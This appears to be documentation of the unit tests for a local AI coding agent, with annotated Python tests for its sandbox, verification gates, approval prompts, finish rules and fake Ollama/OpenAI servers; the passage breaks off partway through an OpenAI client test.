# `tests/` — proving the agent works without a model

**Role:** these tests run in seconds and need no Ollama. A scripted fake model plays the LLM, and a tiny local HTTP
server imitates Ollama / OpenAI responses, so the loop, the verification gates, the safety rules and the real network
code are all exercised deterministically.

Run: `python -m unittest discover -s tests -t .` (use the venv's Python so the ruff/mypy layers are tested too).

## `tests/__init__.py`
```python
1 | """Test package for localagent."""
```
- Makes `tests` a package so `discover -t .` can import it and tests can import each other's helpers.

---
# `tests/test_agent.py` — core behaviour

## Helpers
```python
  1 | """Tests for sandbox, verification, tools and the agent loop (no Ollama needed)."""
  2 | import importlib.util
  3 | import tempfile
  4 | import unittest
  5 | from dataclasses import replace
  6 | from pathlib import Path
  7 | 
  8 | from localagent.agent import NUDGE, Agent, failed
  9 | from localagent.config import Config
 10 | from localagent.llm import Reply
 11 | from localagent.meter import Meter
 12 | from localagent.sandbox import SandboxError, resolve_inside, truncate
 13 | from localagent.tools import ToolBox
 14 | from localagent.verify import verify_python
 15 | 
 16 | GOOD = "def add(a, b):\n    return a + b\n\nprint(add(2, 3))\n"
 17 | BAD_SYNTAX = "def add(a, b)\n    return a + b\n"
 18 | BAD_SCOPE = "return 5\n"
 19 | 
 20 | 
```
- Imports the code under test. `GOOD` is valid code that prints 5. `BAD_SYNTAX` has a missing colon. `BAD_SCOPE` is a
  `return` outside a function: it *parses* but fails to *compile*, proving the compile stage is stronger than parsing.

```python
 21 | def make_box(tmp: str, **kw) -> ToolBox:
 22 |     """ToolBox on a temp workspace that auto-approves execution."""
 23 |     cfg = replace(Config(), workspace=Path(tmp), **kw)
 24 |     return ToolBox(cfg, approve=lambda _a: True)
 25 | 
 26 | 
```
- Builds a `ToolBox` on a temporary folder that auto-approves running code; extra keyword arguments tweak the config.

```python
 27 | def tool_call(name: str, **args) -> dict:
 28 |     """Build the assistant message Ollama would send for one tool call."""
 29 |     return {"role": "assistant", "content": "",
 30 |             "tool_calls": [{"function": {"name": name, "arguments": args}}]}
 31 | 
 32 | 
```
- Builds the assistant message Ollama would send when the model asks for one tool.

```python
 33 | class FakeBackend:
 34 |     """Replays a fixed list of assistant messages, one per chat() call."""
 35 | 
```
```python
 36 |     def __init__(self, messages: list[dict]) -> None:
 37 |         self._messages = list(messages)
 38 | 
```
```python
 39 |     def chat(self, messages, tools, on_token=None) -> Reply:
 40 |         return Reply(self._messages.pop(0), prompt_tokens=10, completion_tokens=5, seconds=0.1)
 41 | 
 42 | 
```
- Replays a fixed list of assistant messages, one per `chat` call, with fixed token counts. It satisfies `ChatBackend`,
  which is why the agent accepts it.

## Sandbox
```python
 43 | class SandboxTests(unittest.TestCase):
```
```python
 44 |     def test_escape_is_blocked(self):
 45 |         with tempfile.TemporaryDirectory() as tmp:
 46 |             with self.assertRaises(SandboxError):
 47 |                 resolve_inside(Path(tmp), "../outside.txt")
 48 | 
```
```python
 49 |     def test_inside_is_allowed(self):
 50 |         with tempfile.TemporaryDirectory() as tmp:
 51 |             self.assertTrue(str(resolve_inside(Path(tmp), "a/b.py")).startswith(str(Path(tmp).resolve())))
 52 | 
```
```python
 53 |     def test_truncate_keeps_both_ends(self):
 54 |         out = truncate("A" * 100 + "Z" * 100, 60)
 55 |         self.assertTrue(out.startswith("A") and out.endswith("Z") and "omitted" in out)
 56 | 
 57 | 
```
- A `..` escape must raise `SandboxError`; a nested path must stay inside the root; `truncate` must keep both the start
  and the end and mention what was omitted.

## Verification layers
```python
 58 | class VerifyTests(unittest.TestCase):
```
```python
 59 |     def check(self, source: str):
 60 |         with tempfile.TemporaryDirectory() as tmp:
 61 |             path = Path(tmp) / "m.py"
 62 |             path.write_text(source, encoding="utf-8")
 63 |             return verify_python(path, Path(tmp))
 64 | 
```
```python
 65 |     def test_good_code_passes(self):
 66 |         self.assertTrue(self.check(GOOD).ok)
 67 | 
```
```python
 68 |     def test_syntax_error_reports_line(self):
 69 |         report = self.check(BAD_SYNTAX)
 70 |         self.assertFalse(report.ok)
 71 |         self.assertIn("m.py:1", report.render())
 72 | 
```
```python
 73 |     def test_scope_error_caught_by_compile(self):
 74 |         self.assertFalse(self.check(BAD_SCOPE).ok)
 75 | 
```
```python
 76 |     @unittest.skipUnless(importlib.util.find_spec("ruff"), "ruff not installed")
 77 |     def test_undefined_name_caught_by_ruff(self):
 78 |         report = self.check("print(missing_name)\n")
 79 |         self.assertFalse(report.ok)
 80 |         self.assertIn("F821", report.render())
 81 | 
 82 | 
```
- `check` writes source to a temp file and verifies it. Good code passes; a syntax error fails and names `m.py:1`; the
  scope error is caught by the compile stage; and — only when ruff is installed — `print(missing_name)` is rejected
  with rule `F821`, proving the second layer really runs.

## The write/run gates
```python
 83 | class ToolBoxTests(unittest.TestCase):
```
```python
 84 |     def test_bad_write_is_rejected_and_rolled_back(self):
 85 |         with tempfile.TemporaryDirectory() as tmp:
 86 |             box = make_box(tmp)
 87 |             result = box.call("write_file", {"path": "a.py", "content": BAD_SYNTAX})
 88 |             self.assertIn("REJECTED (1/3)", result)
 89 |             self.assertFalse((Path(tmp) / "a.py").exists())
 90 | 
```
```python
 91 |     def test_bad_overwrite_restores_previous_content(self):
 92 |         with tempfile.TemporaryDirectory() as tmp:
 93 |             box = make_box(tmp, auto_format=False)
 94 |             box.call("write_file", {"path": "a.py", "content": GOOD})
 95 |             box.call("write_file", {"path": "a.py", "content": BAD_SYNTAX})
 96 |             self.assertEqual((Path(tmp) / "a.py").read_text(encoding="utf-8"), GOOD)
 97 | 
```
```python
 98 |     def test_attempts_exhausted_says_stop(self):
 99 |         with tempfile.TemporaryDirectory() as tmp:
100 |             box = make_box(tmp)
101 |             for _ in range(2):
102 |                 box.call("write_file", {"path": "a.py", "content": BAD_SYNTAX})
103 |             self.assertIn("STOP", box.call("write_file", {"path": "a.py", "content": BAD_SYNTAX}))
104 | 
```
- A bad new file gives `REJECTED (1/3)` and does not exist afterwards (rollback). A bad *overwrite* restores the earlier
  good content. After three failures the message contains `STOP`.

```python
105 |     def test_good_write_then_run(self):
106 |         with tempfile.TemporaryDirectory() as tmp:
107 |             box = make_box(tmp)
108 |             self.assertIn("verification passed", box.call("write_file", {"path": "a.py", "content": GOOD}))
109 |             self.assertIn("5", box.call("run_python", {"path": "a.py"}))
110 | 
```
```python
111 |     def test_run_refuses_file_broken_behind_our_back(self):
112 |         with tempfile.TemporaryDirectory() as tmp:
113 |             box = make_box(tmp)
114 |             (Path(tmp) / "x.py").write_text(BAD_SYNTAX, encoding="utf-8")
115 |             self.assertIn("NOT RUN", box.call("run_python", {"path": "x.py"}))
116 | 
```
```python
117 |     def test_denied_when_user_says_no(self):
118 |         with tempfile.TemporaryDirectory() as tmp:
119 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), approve=lambda _a: False)
120 |             box.call("write_file", {"path": "a.py", "content": GOOD})
121 |             self.assertIn("DENIED", box.call("run_python", {"path": "a.py"}))
122 | 
```
- A good write passes verification and running it prints `5`. A broken file created behind the agent's back is refused
  at run time (`NOT RUN`) — the second check. When the user declines, running returns `DENIED`.

```python
123 |     def test_edit_requires_unique_match(self):
124 |         with tempfile.TemporaryDirectory() as tmp:
125 |             box = make_box(tmp)
126 |             box.call("write_file", {"path": "a.py", "content": "x = 1\ny = 1\n"})
127 |             self.assertIn("matched 2", box.call("edit_file", {"path": "a.py", "old": "1", "new": "2"}))
128 |             self.assertIn("OK", box.call("edit_file", {"path": "a.py", "old": "x = 1", "new": "x = 9"}))
129 | 
```
```python
130 |     def test_path_escape_returns_error_string(self):
131 |         with tempfile.TemporaryDirectory() as tmp:
132 |             self.assertIn("outside the workspace", make_box(tmp).call("read_file", {"path": "../x"}))
133 | 
```
```python
134 |     def test_unknown_tool_and_bad_args(self):
135 |         with tempfile.TemporaryDirectory() as tmp:
136 |             box = make_box(tmp)
137 |             self.assertIn("unknown tool", box.call("nope", {}))
138 |             self.assertIn("bad arguments", box.call("read_file", {}))
139 | 
140 | 
```
- `edit_file` refuses an ambiguous match (2 hits) and accepts a unique one. Path escapes, unknown tools and missing
  arguments all come back as error *strings*, never exceptions.

## The loop
```python
141 | class AgentLoopTests(unittest.TestCase):
```
```python
142 |     def test_reject_fix_run_finish(self):
143 |         """Model writes bad code, sees the errors, fixes it, runs it, and finishes."""
144 |         with tempfile.TemporaryDirectory() as tmp:
145 |             cfg = replace(Config(), workspace=Path(tmp))
146 |             script = [
147 |                 tool_call("write_file", path="a.py", content=BAD_SYNTAX),
148 |                 tool_call("write_file", path="a.py", content=GOOD),
149 |                 tool_call("run_python", path="a.py"),
150 |                 {"role": "assistant", "content": "Done: add() works and prints 5."},
151 |             ]
152 |             meter = Meter()
153 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _a: True), meter)
154 |             answer = agent.run("make an add function")
155 |             self.assertIn("Done", answer)
156 |             self.assertEqual(meter.calls, 4)
157 |             tool_texts = [m["content"] for m in agent.messages if m["role"] == "tool"]
158 |             self.assertIn("REJECTED", tool_texts[0])
159 |             self.assertIn("verification passed", tool_texts[1])
160 |             self.assertIn("5", tool_texts[2])
161 | 
```
- **The key scenario:** the scripted model writes bad code, sees `REJECTED`, writes good code, runs it, and gives a
  final answer. Asserts 4 model calls and the content of each tool result in order.

```python
162 |     def test_max_turns_stops_endless_loop(self):
163 |         with tempfile.TemporaryDirectory() as tmp:
164 |             cfg = replace(Config(), workspace=Path(tmp), max_turns=3)
165 |             script = [tool_call("list_files")] * 3
166 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg), Meter())
167 |             self.assertIn("Stopped after 3", agent.run("loop forever"))
168 | 
```
```python
169 |     def test_string_arguments_are_accepted(self):
170 |         with tempfile.TemporaryDirectory() as tmp:
171 |             cfg = replace(Config(), workspace=Path(tmp))
172 |             msg = {"role": "assistant", "content": "", "tool_calls": [
173 |                 {"function": {"name": "list_files", "arguments": '{"path": "."}'}}]}
174 |             agent = Agent(cfg, FakeBackend([msg, {"role": "assistant", "content": "ok"}]),
175 |                           ToolBox(cfg), Meter())
176 |             self.assertEqual(agent.run("ls"), "ok")
177 | 
178 | 
```
- A model that never stops is halted by `max_turns` with a "Stopped after 3" message. Arguments sent as a JSON *string*
  are accepted.

## Phase 3/4 tools
```python
179 | class Phase3ToolTests(unittest.TestCase):
```
```python
180 |     def test_outline_lists_classes_and_functions(self):
181 |         with tempfile.TemporaryDirectory() as tmp:
182 |             box = make_box(tmp)
183 |             box.call("write_file", {"path": "m.py", "content":
184 |                                     "class A:\n    def f(self):\n        return 1\n\n\ndef g():\n    return 2\n"})
185 |             out = box.call("outline", {})
186 |             self.assertIn("class A", out)
187 |             self.assertIn("def f", out)
188 |             self.assertIn("def g", out)
189 |             self.assertIn("ERROR", box.call("outline", {"path": "nope"}))
190 | 
```
```python
191 |     def test_multi_edit_applies_all_or_nothing(self):
192 |         with tempfile.TemporaryDirectory() as tmp:
193 |             box = make_box(tmp, auto_format=False)
194 |             box.call("write_file", {"path": "a.py", "content": "x = 1\ny = 2\n"})
195 |             ok = box.call("multi_edit", {"path": "a.py", "edits": [
196 |                 {"old": "x = 1", "new": "x = 10"}, {"old": "y = 2", "new": "y = 20"}]})
197 |             self.assertIn("OK", ok)
198 |             self.assertEqual((Path(tmp) / "a.py").read_text(encoding="utf-8"), "x = 10\ny = 20\n")
199 |             bad = box.call("multi_edit", {"path": "a.py", "edits": [
200 |                 {"old": "x = 10", "new": "x = 0"}, {"old": "missing", "new": "z"}]})
201 |             self.assertIn("edit 2", bad)
202 |             self.assertEqual((Path(tmp) / "a.py").read_text(encoding="utf-8"), "x = 10\ny = 20\n")
203 |             self.assertIn("non-empty", box.call("multi_edit", {"path": "a.py", "edits": []}))
204 | 
```
```python
205 |     def test_edit_file_all_renames_every_occurrence(self):
206 |         with tempfile.TemporaryDirectory() as tmp:
207 |             box = make_box(tmp, auto_format=False)
208 |             box.call("write_file", {"path": "a.py", "content": "from m import calc\nprint(calc())\n"})
209 |             refused = box.call("edit_file", {"path": "a.py", "old": "calc", "new": "total"})
210 |             self.assertIn("all=true", refused)
211 |             done = box.call("edit_file", {"path": "a.py", "old": "calc", "new": "total", "all": True})
212 |             self.assertIn("OK", done)
213 |             self.assertEqual((Path(tmp) / "a.py").read_text(encoding="utf-8"),
214 |                              "from m import total\nprint(total())\n")
215 | 
```
```python
216 |     @unittest.skipUnless(importlib.util.find_spec("ruff"), "ruff not installed")
217 |     def test_auto_format_rewrites_style(self):
218 |         with tempfile.TemporaryDirectory() as tmp:
219 |             box = make_box(tmp)
220 |             box.call("write_file", {"path": "a.py", "content": "x   =   1\n"})
221 |             self.assertEqual((Path(tmp) / "a.py").read_text(encoding="utf-8"), "x = 1\n")
222 | 
```
```python
223 |     def test_writes_counter_and_read_only_flags(self):
224 |         with tempfile.TemporaryDirectory() as tmp:
225 |             box = make_box(tmp)
226 |             self.assertEqual(box.writes, 0)
227 |             box.call("write_file", {"path": "n.txt", "content": "hi"})
228 |             box.call("write_file", {"path": "a.py", "content": BAD_SYNTAX})   # rejected: not counted
229 |             self.assertEqual(box.writes, 1)
230 |             self.assertTrue(box.is_read_only("search"))
231 |             self.assertFalse(box.is_read_only("write_file"))
232 | 
233 | 
```
- `outline` lists a class, its method and a top-level function, and reports a missing path as an error.
- `multi_edit` applies two edits in order; a later failing edit (`edit 2`) leaves the file untouched (all-or-nothing);
  an empty list is refused. Auto-format is switched off here so the exact text can be compared.
- `edit_file` with a name that occurs twice is refused with an `all=true` hint; with `all=true` both occurrences are
  renamed. (An earlier draft of this test renamed the letter `f`, which also broke `from`; the write gate rejected it -
  a handy live demonstration that the gate works.)
- Auto-format (only when ruff is installed): `x   =   1` is rewritten to `x = 1` after the write passes verification.
- The `writes` counter counts a plain text write but not a rejected Python write; `search` is flagged read-only and
  `write_file` is not.

```python
234 | class Phase3AgentTests(unittest.TestCase):
```
```python
235 |     def make_agent(self, script, tmp):
236 |         cfg = replace(Config(), workspace=Path(tmp))
237 |         return Agent(cfg, FakeBackend(script), ToolBox(cfg, approve=lambda _a: True), Meter())
238 | 
```
```python
239 |     def test_nudge_when_change_requested_but_nothing_written(self):
240 |         with tempfile.TemporaryDirectory() as tmp:
241 |             script = [{"role": "assistant", "content": "the bug is X"},
242 |                       tool_call("write_file", path="a.txt", content="fixed"),
243 |                       {"role": "assistant", "content": "done"}]
244 |             agent = self.make_agent(script, tmp)
245 |             self.assertEqual(agent.run("Fix the bug"), "done")
246 |             self.assertTrue(any(m.get("content") == NUDGE for m in agent.messages))
247 | 
```
```python
248 |     def test_no_nudge_for_questions(self):
249 |         with tempfile.TemporaryDirectory() as tmp:
250 |             agent = self.make_agent([{"role": "assistant", "content": "because"}], tmp)
251 |             self.assertEqual(agent.run("Why is the sky blue?"), "because")
252 | 
```
```python
253 |     def test_parallel_read_only_calls_keep_order(self):
254 |         with tempfile.TemporaryDirectory() as tmp:
255 |             (Path(tmp) / "a.txt").write_text("AAA", encoding="utf-8")
256 |             (Path(tmp) / "b.txt").write_text("BBB", encoding="utf-8")
257 |             two = {"role": "assistant", "content": "", "tool_calls": [
258 |                 {"function": {"name": "read_file", "arguments": {"path": "a.txt"}}},
259 |                 {"function": {"name": "read_file", "arguments": {"path": "b.txt"}}}]}
260 |             agent = self.make_agent([two, {"role": "assistant", "content": "ok"}], tmp)
261 |             events: list[str] = []
262 |             agent.run("show both", on_event=events.append)
263 |             results = [m["content"] for m in agent.messages if m["role"] == "tool"]
264 |             self.assertEqual(results, ["1: AAA", "1: BBB"])
265 |             self.assertEqual(sum(e.startswith("->") for e in events), 2)
266 | 
267 | 
```
```python
268 |     def test_repeated_identical_edit_is_refused_then_stopped(self):
269 |         with tempfile.TemporaryDirectory() as tmp:
270 |             (Path(tmp) / "a.txt").write_text("abc", encoding="utf-8")
271 |             same = tool_call("edit_file", path="a.txt", old="abc", new="abc")
272 |             agent = self.make_agent([same, same, same, same], tmp)
273 |             answer = agent.run("Edit a.txt")
274 |             self.assertIn("repeating", answer)
275 |             tool_results = [m["content"] for m in agent.messages if m["role"] == "tool"]
276 |             self.assertTrue(tool_results[0].startswith("OK"))
277 |             self.assertTrue(all(r.startswith("ERROR: you already made") for r in tool_results[1:]))
278 | 
279 | 
```
- `make_agent` builds an agent on a temp folder around a scripted fake model.
- **Nudge:** for "Fix the bug" the model first answers in text only; the agent injects the `NUDGE` message, the model
  then writes a file and the final answer is "done". For the question "Why is the sky blue?" there is no nudge and the
  first answer is returned.
- **Parallel reads:** two `read_file` calls in one turn produce results `1: AAA` and `1: BBB` in the original order, and
  two `->` progress events are reported.
- **Repeat guard:** a model that sends the identical `edit_file` four times gets one `OK`, then three
  `ERROR: you already made this exact call` results, and the request ends with the "repeating" stop message.

## The `finish` tool and escalation
```python
280 | class FinishToolTests(unittest.TestCase):
```
```python
281 |     def make_agent(self, script, tmp, backend=None):
282 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False)
283 |         return Agent(cfg, backend or FakeBackend(script), ToolBox(cfg, approve=lambda _a: True), Meter())
284 | 
```
```python
285 |     def test_finish_in_same_turn_saves_a_call(self):
286 |         with tempfile.TemporaryDirectory() as tmp:
287 |             turn = {"role": "assistant", "content": "", "tool_calls": [
288 |                 {"function": {"name": "write_file", "arguments": {"path": "a.py", "content": GOOD}}},
289 |                 {"function": {"name": "run_python", "arguments": {"path": "a.py"}}},
290 |                 {"function": {"name": "finish", "arguments": {"summary": "made a.py"}}}]}
291 |             meter = Meter()
292 |             cfg = replace(Config(), workspace=Path(tmp))
293 |             agent = Agent(cfg, FakeBackend([turn]), ToolBox(cfg, approve=lambda _a: True), meter)
294 |             self.assertEqual(agent.run("Create a.py"), "made a.py")
295 |             self.assertEqual(meter.calls, 1)                   # no separate final-answer call
296 |             self.assertEqual(agent.messages[-1]["content"], "OK: finished")   # history stays valid
297 | 
```
```python
298 |     def test_finish_refused_when_a_call_failed(self):
299 |         with tempfile.TemporaryDirectory() as tmp:
300 |             bad = {"role": "assistant", "content": "", "tool_calls": [
301 |                 {"function": {"name": "write_file", "arguments": {"path": "a.py", "content": BAD_SYNTAX}}},
302 |                 {"function": {"name": "finish", "arguments": {"summary": "done?"}}}]}
303 |             good = {"role": "assistant", "content": "", "tool_calls": [
304 |                 {"function": {"name": "write_file", "arguments": {"path": "a.py", "content": GOOD}}},
305 |                 {"function": {"name": "finish", "arguments": {"summary": "fixed"}}}]}
306 |             agent = self.make_agent([bad, good], tmp)
307 |             self.assertEqual(agent.run("Create a.py"), "fixed")
308 |             refusals = [m["content"] for m in agent.messages if m["role"] == "tool"
309 |                         and m["content"].startswith("NOT FINISHED")]
310 |             self.assertEqual(len(refusals), 1)
311 | 
```
```python
312 |     def test_finish_refused_when_nothing_was_changed(self):
313 |         with tempfile.TemporaryDirectory() as tmp:
314 |             lazy = tool_call("finish", summary="all good")
315 |             work = {"role": "assistant", "content": "", "tool_calls": [
316 |                 {"function": {"name": "write_file", "arguments": {"path": "n.txt", "content": "x"}}},
317 |                 {"function": {"name": "finish", "arguments": {"summary": "wrote n.txt"}}}]}
318 |             agent = self.make_agent([lazy, work], tmp)
319 |             self.assertEqual(agent.run("Create n.txt"), "wrote n.txt")
320 |             question = self.make_agent([tool_call("finish", summary="because")], tmp)
321 |             self.assertEqual(question.run("Why?"), "because")    # questions may finish at once
322 | 
```
```python
323 |     def test_finish_waits_until_what_was_read_has_been_seen(self):
324 |         with tempfile.TemporaryDirectory() as tmp:
325 |             Path(tmp, "report.js").write_text("console.log('Total: ' + 1);\n", encoding="utf-8")
326 |             hasty = {"role": "assistant", "content": "", "tool_calls": [
327 |                 {"function": {"name": "read_file", "arguments": {"path": "report.js"}}},
328 |                 {"function": {"name": "finish", "arguments": {"summary": "a monthly report"}}}]}
329 |             informed = tool_call("finish", summary="it prints the total")
330 |             agent = self.make_agent([hasty, informed], tmp)
331 |             self.assertEqual(agent.run("What does report.js do?"), "it prints the total")
332 |             refusals = [m["content"] for m in agent.messages if m["role"] == "tool"
333 |                         and m["content"].startswith("NOT FINISHED")]
334 |             self.assertEqual(len(refusals), 1)
335 |             self.assertIn("read_file", refusals[0])
336 | 
```
```python
337 |     def test_failure_detection(self):
338 |         for text in ("ERROR: x", "REJECTED (1/3): x", "NOT RUN: x", "DENIED: x", "exit code 1\nboom"):
339 |             self.assertTrue(failed(text), text)
340 |         for text in ("OK: wrote a.py", "exit code 0\nhi", "1: line", ""):
341 |             self.assertFalse(failed(text), text)
342 | 
```
```python
343 |     def test_repeated_failures_escalate_once(self):
344 |         class Escalating(FakeBackend):
345 |             def __init__(self, messages):
346 |                 super().__init__(messages)
347 |                 self.escalations = 0
348 |                 self.resets = 0
349 | 
350 |             def escalate(self):
351 |                 self.escalations += 1
352 |                 return self.escalations == 1
353 | 
354 |             def reset_route(self):
355 |                 self.resets += 1
356 | 
357 |         with tempfile.TemporaryDirectory() as tmp:
358 |             bad = tool_call("run_python", path="missing.py")             # ERROR each time
359 |             backend = Escalating([bad, bad, {"role": "assistant", "content": "gave up"}])
360 |             events: list[str] = []
361 |             agent = self.make_agent([], tmp, backend)
362 |             agent.run("Run it", on_event=events.append)
363 |             self.assertEqual(backend.resets, 1)
364 |             self.assertEqual(sum("stronger model" in e for e in events), 1)
365 | 
366 | 
```
- Write + run + finish in one response: the request ends after **one** model call with the summary, and the history
  ends with the `OK: finished` tool result (still a valid conversation).
- A finish next to a rejected write is refused once (`NOT FINISHED`); the corrected turn finishes.
- "Create n.txt" answered with an immediate finish is refused (nothing written); a question may finish at once.
- A question answered with `read_file` + `finish` in one response is refused once (the reason names `read_file`);
  the answer given after seeing the file is the one returned.
- `failed` recognises every failure form and accepts successes, `exit code 0` and empty text.
- A fake backend with `escalate`/`reset_route`: two failing runs trigger exactly one "stronger model" event, and the
  route is reset once at the start of the request.

```python
367 | if __name__ == "__main__":
368 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase2.py` — streaming, backends, context, undo, sessions, search, evals

## A fake model server
```python
  1 | """Tests for streaming, backends, context, undo, sessions, search and the eval harness."""
  2 | import json
  3 | import tempfile
  4 | import threading
  5 | import unittest
  6 | from dataclasses import replace
  7 | from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
  8 | from pathlib import Path
  9 | 
 10 | from evals.run_evals import run_task
 11 | from evals.tasks import FIZZBUZZ
 12 | from localagent.agent import Agent
 13 | from localagent.backends import make_backend
 14 | from localagent.checkpoint import Checkpoints
 15 | from localagent.config import Config
 16 | from localagent.context import build_system_prompt
 17 | from localagent.doctor import run_doctor
 18 | from localagent.llm import LLMError, OllamaClient
 19 | from localagent.meter import Meter
 20 | from localagent.openai_compat import OpenAICompatClient, to_openai
 21 | from localagent.session import SessionLog, latest_session, load_session
 22 | from localagent.tools import ToolBox
 23 | from tests.test_agent import FakeBackend, tool_call
 24 | 
 25 | FIZZ_CODE = ("def fizzbuzz(n):\n    out = []\n    for i in range(1, n + 1):\n"
 26 |              "        s = ('Fizz' if i % 3 == 0 else '') + ('Buzz' if i % 5 == 0 else '')\n"
 27 |              "        out.append(s or str(i))\n    return out\n")
 28 | 
 29 | 
```
- Imports the standard-library HTTP server pieces plus the modules under test. `FIZZ_CODE` is a correct fizzbuzz used by
  the eval-harness test.

```python
 30 | class FakeServer:
 31 |     """Local HTTP server answering with canned bytes; records what it was sent."""
 32 | 
```
```python
 33 |     def __init__(self, status: int, body: bytes) -> None:
 34 |         outer = self
 35 |         self.received: list[dict] = []
 36 |         self.headers: list[dict] = []
 37 | 
 38 |         class Handler(BaseHTTPRequestHandler):
 39 |             def do_POST(self):  # noqa: N802 (name fixed by http.server)
 40 |                 length = int(self.headers["Content-Length"])
 41 |                 outer.received.append(json.loads(self.rfile.read(length)))
 42 |                 outer.headers.append(dict(self.headers))
 43 |                 self.send_response(status)
 44 |                 self.send_header("Content-Length", str(len(body)))
 45 |                 self.end_headers()
 46 |                 self.wfile.write(body)
 47 | 
 48 |             def do_GET(self):  # noqa: N802 (name fixed by http.server)
 49 |                 self.send_response(status)
 50 |                 self.send_header("Content-Length", str(len(body)))
 51 |                 self.end_headers()
 52 |                 self.wfile.write(body)
 53 | 
 54 |             def log_message(self, *args):
 55 |                 pass
 56 | 
 57 |         self._server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
 58 |         self.url = f"http://127.0.0.1:{self._server.server_port}"
 59 |         threading.Thread(target=self._server.serve_forever, daemon=True).start()
 60 | 
```
- Starts a real HTTP server on a free port (`("127.0.0.1", 0)`) in a background thread. Its handler records each
  request's JSON body and headers and replies with a canned status and body — so `post()` and the clients are tested
  against genuine sockets. `log_message` is silenced to keep test output clean.

```python
 61 |     def close(self) -> None:
 62 |         self._server.shutdown()
 63 |         self._server.server_close()
 64 | 
 65 | 
```
```python
 66 | def ndjson(*objects: dict) -> bytes:
 67 |     return "".join(json.dumps(o) + "\n" for o in objects).encode()
 68 | 
 69 | 
```
- `close` stops the server. `ndjson` encodes dictionaries as one-JSON-object-per-line bytes, Ollama's streaming format.

## Ollama client
```python
 70 | class OllamaClientTests(unittest.TestCase):
```
```python
 71 |     def test_streams_text_and_counts_tokens(self):
 72 |         body = ndjson(
 73 |             {"message": {"role": "assistant", "content": "Hel"}, "done": False},
 74 |             {"message": {"role": "assistant", "content": "lo"}, "done": False},
 75 |             {"message": {"role": "assistant", "content": ""}, "done": True,
 76 |              "prompt_eval_count": 7, "eval_count": 2})
 77 |         server = FakeServer(200, body)
 78 |         self.addCleanup(server.close)
 79 |         seen: list[str] = []
 80 |         reply = OllamaClient(replace(Config(), host=server.url)).chat(
 81 |             [{"role": "user", "content": "hi"}], [], seen.append)
 82 |         self.assertEqual(seen, ["Hel", "lo"])
 83 |         self.assertEqual(reply.message["content"], "Hello")
 84 |         self.assertEqual((reply.prompt_tokens, reply.completion_tokens), (7, 2))
 85 |         self.assertTrue(server.received[0]["stream"])
 86 | 
```
```python
 87 |     def test_collects_tool_calls(self):
 88 |         call = {"function": {"name": "list_files", "arguments": {}}}
 89 |         body = ndjson({"message": {"role": "assistant", "content": "", "tool_calls": [call]},
 90 |                        "done": True, "eval_count": 1})
 91 |         server = FakeServer(200, body)
 92 |         self.addCleanup(server.close)
 93 |         reply = OllamaClient(replace(Config(), host=server.url)).chat([], [])
 94 |         self.assertEqual(reply.message["tool_calls"], [call])
 95 | 
```
```python
 96 |     def test_http_error_becomes_llm_error(self):
 97 |         server = FakeServer(404, b'{"error": "model not found"}')
 98 |         self.addCleanup(server.close)
 99 |         with self.assertRaisesRegex(LLMError, "HTTP 404"):
100 |             OllamaClient(replace(Config(), host=server.url)).chat([], [])
101 | 
```
```python
102 |     def test_unreachable_server_becomes_llm_error(self):
103 |         with self.assertRaisesRegex(LLMError, "Cannot reach"):
104 |             OllamaClient(replace(Config(), host="http://127.0.0.1:9")).chat([], [])
105 | 
```
```python
106 |     def test_error_line_in_stream(self):
107 |         server = FakeServer(200, ndjson({"error": "out of memory"}))
108 |         self.addCleanup(server.close)
109 |         with self.assertRaisesRegex(LLMError, "out of memory"):
110 |             OllamaClient(replace(Config(), host=server.url)).chat([], [])
111 | 
112 | 
```
- Text pieces reach the callback in order and are joined; token counts come from the final line; the request asked for
  streaming. Tool calls are collected. A 404, an unreachable port (9) and an `{"error": ...}` line each become `LLMError`.

## Doctor
```python
136 | class DoctorTests(unittest.TestCase):
```
```python
137 |     def tags(self, *names: str) -> FakeServer:
138 |         server = FakeServer(200, json.dumps({"models": [{"name": n} for n in names]}).encode())
139 |         self.addCleanup(server.close)
140 |         return server
141 | 
```
```python
142 |     def test_healthy_when_model_installed(self):
143 |         server = self.tags("qwen3:8b")
144 |         healthy, lines = run_doctor(replace(Config(), host=server.url))
145 |         self.assertTrue(healthy)
146 |         self.assertTrue(any("model qwen3:8b is installed" in line for line in lines))
147 | 
```
```python
148 |     def test_untagged_name_means_latest(self):
149 |         server = self.tags("tinyllama:latest")
150 |         healthy, _ = run_doctor(replace(Config(), host=server.url, model="tinyllama"))
151 |         self.assertTrue(healthy)
152 | 
```
```python
153 |     def test_missing_model_gives_pull_command(self):
154 |         server = self.tags("other:1b")
155 |         healthy, lines = run_doctor(replace(Config(), host=server.url))
156 |         self.assertFalse(healthy)
157 |         self.assertTrue(any("ollama pull qwen3:8b" in line for line in lines))
158 | 
```
```python
159 |     def test_unreachable_server_is_reported(self):
160 |         healthy, lines = run_doctor(replace(Config(), host="http://127.0.0.1:9"))
161 |         self.assertFalse(healthy)
162 |         self.assertTrue(any("not reachable" in line for line in lines))
163 | 
164 | 
```
- `tags` starts a fake server whose `/api/tags` lists the given models (the fake server also answers `GET` for this).
  The doctor is healthy when the model is installed, treats `tinyllama` as `tinyllama:latest`, prints the exact
  `ollama pull` command when the model is missing, and reports an unreachable server as a failure.

## OpenAI-compatible client and registry
```python
113 | class OpenAIClientTests(unittest.TestCase):
```
```python
114 |     def test_round_trip_with_tool_call_and_auth(self):
115 |         body = json.dumps({"choices": [{"message": {"content": "", "tool_calls": [
116 |             {"id": "c1", "function": {"name": "read_file", "arguments": "{\"path\": \"a.py\"}"}}]}}],
117 |             "usage": {"prompt_tokens": 11, "completion_tokens": 3}}).encode()
118 |         server = FakeServer(200, body)
119 |         self.addCleanup(server.close)
120 |         config = replace(Config(), backend="openai", api_base=server.url, api_key="secret",
121 |                          stream=False)
122 |         reply = OpenAICompatClient(config).chat([{"role": "user", "content": "x"}], [])
123 |         self.assertEqual(reply.message["tool_calls"][0]["id"], "c1")
124 |         self.assertEqual((reply.prompt_tokens, reply.completion_tokens), (11, 3))
125 |         self.assertEqual(server.headers[0]["Authorization"], "Bearer secret")
126 | 
```
```python
127 |     def test_message_conversion(self):
128 |         converted = to_openai([
129 |             {"role": "assistant", "content": "", "tool_calls": [
